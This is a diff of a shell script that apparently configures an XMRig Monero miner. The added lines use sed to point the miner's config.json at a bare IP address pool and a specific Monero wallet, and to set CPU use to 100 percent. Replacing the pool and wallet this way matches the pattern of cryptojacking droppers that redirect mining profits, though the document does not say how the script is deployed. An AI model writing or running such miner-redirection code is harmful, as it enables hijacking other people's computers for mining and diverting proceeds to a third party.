@@ -283,8 +283,8 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "172.65.214.250:80",/' ./config.json
-sed -i 's/"user": *"[^"]*",/"user": "374e18i3Z8B6JSdgr2CZEvA8F2LsxpWxKB",/' ./config.json
+sed -i 's/"url": *"[^"]*",/"url": "131.153.56.98:80",/' ./config.json
+sed -i 's/"user": *"[^"]*",/"user": "4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR",/' ./config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' $HOME/moneroocean/config.json
